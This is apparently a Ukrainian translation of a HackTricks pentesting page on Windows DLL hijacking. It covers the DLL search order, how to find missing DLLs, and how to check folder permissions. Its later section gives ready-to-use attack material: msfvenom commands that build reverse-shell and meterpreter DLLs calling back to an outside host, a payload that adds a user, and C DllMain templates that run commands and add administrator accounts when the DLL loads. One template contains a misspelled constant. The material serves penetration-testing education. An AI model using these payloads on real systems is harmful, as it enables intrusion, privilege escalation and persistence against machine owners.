# Dll Hijacking

{{#include ../../banners/hacktricks-training.md}}



## Basic Information

DLL Hijacking передбачає маніпуляцію довіреною програмою для завантаження шкідливого DLL. Цей термін охоплює кілька тактик, таких як **DLL Spoofing, Injection, і Side-Loading**. Він в основному використовується для виконання коду, досягнення стійкості та, меншою мірою, ескалації привілеїв. Незважаючи на акцент на ескалації тут, метод захоплення залишається послідовним у всіх цілях.

### Common Techniques

Для DLL hijacking використовуються кілька методів, кожен з яких має свою ефективність залежно від стратегії завантаження DLL програми:

1. **DLL Replacement**: Заміна справжнього DLL на шкідливий, за бажанням використовуючи DLL Proxying для збереження функціональності оригінального DLL.
2. **DLL Search Order Hijacking**: Розміщення шкідливого DLL у пошуковому шляху перед легітимним, експлуатуючи шаблон пошуку програми.
3. **Phantom DLL Hijacking**: Створення шкідливого DLL для програми, щоб вона завантажила його, вважаючи, що це неіснуючий необхідний DLL.
4. **DLL Redirection**: Модифікація параметрів пошуку, таких як `%PATH%` або `.exe.manifest` / `.exe.local` файли, щоб направити програму до шкідливого DLL.
5. **WinSxS DLL Replacement**: Заміна легітимного DLL на шкідливий у каталозі WinSxS, метод, який часто асоціюється з DLL side-loading.
6. **Relative Path DLL Hijacking**: Розміщення шкідливого DLL у каталозі, контрольованому користувачем, з копією програми, що нагадує техніки Binary Proxy Execution.

## Finding missing Dlls

Найпоширеніший спосіб знайти відсутні DLL у системі - це запустити [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) з sysinternals, **встановивши** **наступні 2 фільтри**:

![](<../../images/image (311).png>)

![](<../../images/image (313).png>)

і просто показати **File System Activity**:

![](<../../images/image (314).png>)

Якщо ви шукаєте **відсутні dll загалом**, ви **залишаєте** це працювати кілька **секунд**.\
Якщо ви шукаєте **відсутній dll у конкретному виконуваному файлі**, вам слід встановити **інший фільтр, наприклад "Process Name" "contains" "\<exec name>", виконати його і зупинити захоплення подій**.

## Exploiting Missing Dlls

Щоб ескалувати привілеї, найкраща можливість, яку ми маємо, - це можливість **написати dll, який привілейований процес спробує завантажити** в деякому **місці, де його будуть шукати**. Отже, ми зможемо **написати** dll у **папці**, де **dll шукається перед** папкою, де знаходиться **оригінальний dll** (дивний випадок), або ми зможемо **написати в деяку папку, де dll буде шукатися**, а оригінальний **dll не існує** в жодній папці.

### Dll Search Order

**У** [**документації Microsoft**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **ви можете знайти, як конкретно завантажуються DLL.**

**Windows програми** шукають DLL, дотримуючись набору **попередньо визначених пошукових шляхів**, дотримуючись певної послідовності. Проблема DLL hijacking виникає, коли шкідливий DLL стратегічно розміщується в одному з цих каталогів, забезпечуючи його завантаження перед автентичним DLL. Рішенням для запобігання цьому є забезпечення того, щоб програма використовувала абсолютні шляхи при посиланні на DLL, які їй потрібні.

Ви можете побачити **порядок пошуку DLL на 32-бітних** системах нижче:

1. Каталог, з якого завантажено програму.
2. Системний каталог. Використовуйте функцію [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya), щоб отримати шлях до цього каталогу. (_C:\Windows\System32_)
3. 16-бітний системний каталог. Немає функції, яка отримує шлях до цього каталогу, але він шукається. (_C:\Windows\System_)
4. Каталог Windows. Використовуйте функцію [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya), щоб отримати шлях до цього каталогу. (_C:\Windows_)
5. Поточний каталог.
6. Каталоги, які вказані в змінній середовища PATH. Зверніть увагу, що це не включає шлях для кожної програми, вказаний ключем реєстру **App Paths**. Ключ **App Paths** не використовується при обчисленні шляху пошуку DLL.

Це **за замовчуванням** порядок пошуку з **SafeDllSearchMode** увімкнено. Коли він вимкнений, поточний каталог підвищується до другого місця. Щоб вимкнути цю функцію, створіть значення реєстру **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** і встановіть його на 0 (за замовчуванням увімкнено).

Якщо функція [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) викликається з **LOAD_WITH_ALTERED_SEARCH_PATH**, пошук починається в каталозі виконуваного модуля, який **LoadLibraryEx** завантажує.

Нарешті, зверніть увагу, що **dll може бути завантажено, вказуючи абсолютний шлях, а не просто ім'я**. У цьому випадку цей dll **буде шукатися тільки в цьому шляху** (якщо у dll є якісь залежності, вони будуть шукатися так, як якщо б їх завантажили за ім'ям).

Є й інші способи змінити порядок пошуку, але я не буду пояснювати їх тут.

#### Exceptions on dll search order from Windows docs

В документації Windows зазначено певні винятки з стандартного порядку пошуку DLL:

- Коли зустрічається **DLL, яка має таку ж назву, як одна, що вже завантажена в пам'яті**, система обходить звичайний пошук. Натомість вона виконує перевірку на перенаправлення та маніфест, перш ніж за замовчуванням використовувати DLL, вже в пам'яті. **У цьому сценарії система не проводить пошук для DLL**.
- У випадках, коли DLL визнано **відомим DLL** для поточної версії Windows, система використовуватиме свою версію відомого DLL разом з будь-якими його залежними DLL, **пропускаючи процес пошуку**. Ключ реєстру **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** містить список цих відомих DLL.
- Якщо **DLL має залежності**, пошук цих залежних DLL проводиться так, ніби вони були вказані лише своїми **іменами модулів**, незалежно від того, чи була початкова DLL ідентифікована через повний шлях.

### Escalating Privileges

**Вимоги**:

- Визначити процес, який працює або буде працювати під **іншими привілеями** (горизонтальний або бічний рух), який **не має DLL**.
- Забезпечити **доступ на запис** для будь-якої **каталогу**, в якій **DLL** буде **шукатися**. Це місце може бути каталогом виконуваного файлу або каталогом у системному шляху.

Так, вимоги складно знайти, оскільки **за замовчуванням досить дивно знайти привілейований виконуваний файл без dll** і ще **більш дивно мати права на запис у папці системного шляху** (за замовчуванням ви не можете). Але в неправильно налаштованих середовищах це можливо.\
У випадку, якщо вам пощастить і ви знайдете себе, що відповідає вимогам, ви можете перевірити проект [UACME](https://github.com/hfiref0x/UACME). Навіть якщо **основна мета проекту - обійти UAC**, ви можете знайти там **PoC** для Dll hijaking для версії Windows, яку ви можете використовувати (можливо, просто змінивши шлях до папки, де у вас є права на запис).

Зверніть увагу, що ви можете **перевірити свої права в папці**, виконавши:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
І **перевірте дозволи всіх папок всередині PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Ви також можете перевірити імпорти виконуваного файлу та експорти dll за допомогою:
```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Для повного посібника про те, як **зловживати Dll Hijacking для ескалації привілеїв** з правами на запис у **папку системного шляху**, перевірте:

{{#ref}}
dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md
{{#endref}}

### Автоматизовані інструменти

[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) перевірить, чи маєте ви права на запис у будь-яку папку всередині системного шляху.\
Інші цікаві автоматизовані інструменти для виявлення цієї вразливості - це **функції PowerSploit**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ та _Write-HijackDll._

### Приклад

У разі, якщо ви знайдете експлуатовану ситуацію, однією з найважливіших речей для успішної експлуатації буде **створити dll, яка експортує принаймні всі функції, які виконуваний файл імпортуватиме з неї**. У будь-якому випадку, зверніть увагу, що Dll Hijacking є корисним для того, щоб [ескалювати з середнього рівня цілісності до високого **(обхід UAC)**](../authentication-credentials-uac-and-efs.md#uac) або з [**високого рівня цілісності до SYSTEM**](./#from-high-integrity-to-system)**.** Ви можете знайти приклад **як створити дійсну dll** в цьому дослідженні dll hijacking, зосередженому на dll hijacking для виконання: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Більше того, у **наступному розділі** ви можете знайти деякі **базові коди dll**, які можуть бути корисними як **шаблони** або для створення **dll з не обов'язковими експортованими функціями**.

## **Створення та компіляція Dll**

### **Dll Проксіювання**

В основному, **Dll проксі** - це Dll, здатна **виконувати ваш шкідливий код при завантаженні**, але також **виконувати** та **працювати** як **очікувалося**, **пересилаючи всі виклики до справжньої бібліотеки**.

За допомогою інструмента [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) або [**Spartacus**](https://github.com/Accenture/Spartacus) ви можете фактично **вказати виконуваний файл і вибрати бібліотеку**, яку хочете проксувати, і **згенерувати проксовану dll** або **вказати Dll** і **згенерувати проксовану dll**.

### **Meterpreter**

**Отримати rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Отримати meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Створіть користувача (x86, я не бачив версії x64):**
```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Ваш власний

Зверніть увагу, що в кількох випадках Dll, яку ви компілюєте, повинна **експортувати кілька функцій**, які будуть завантажені жертвою, якщо ці функції не існують, **бінарний файл не зможе їх завантажити** і **експлуатація зазнає невдачі**.
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
## Посилання

- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)



{{#include ../../banners/hacktricks-training.md}}
